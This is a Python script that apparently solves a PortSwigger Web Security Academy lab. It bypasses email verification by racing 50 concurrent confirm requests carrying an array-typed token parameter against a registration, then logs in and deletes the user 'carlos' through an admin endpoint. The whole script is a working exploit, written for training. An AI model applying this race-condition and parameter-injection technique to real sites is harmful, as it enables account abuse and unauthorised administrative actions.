from web_security_academy.core.async_lab_session import AsyncLabSession
from web_security_academy.core.logger import logger
from urllib.parse import urljoin
from httpx import Request

import asyncio
import random
import string


def solve_lab(session):
    asyncio.run(solve_lab_async(session))
    return


async def solve_lab_async(session):
    async with AsyncLabSession(session) as session:
        username = "".join(random.choice(string.ascii_lowercase) for _ in range(10))
        logger.info(f"Generated random username: {username}")

        data = {
            "csrf": await session.get_csrf_token("/register"),
            "username": username,
            "email": f"{username}@ginandjuice.shop",
            "password": "123456",
        }
        coros = [session.post_path("/register", data=data)]

        confirm = Request("POST", urljoin(session.url, "/confirm?token[]="))
        coros += [session.send(confirm) for _ in range(50)]
        responses = await asyncio.gather(*coros)

        for resp in responses[1:]:
            if resp.status_code != 400:
                logger.success(f"Successfully registered user {username}")
                break
        else:
            logger.failure("Unable to bypass email verification")
            return

        await session.login(username, "123456")
        await session.get_path("/admin/delete?username=carlos")
        logger.info('Deleted user "carlos"')
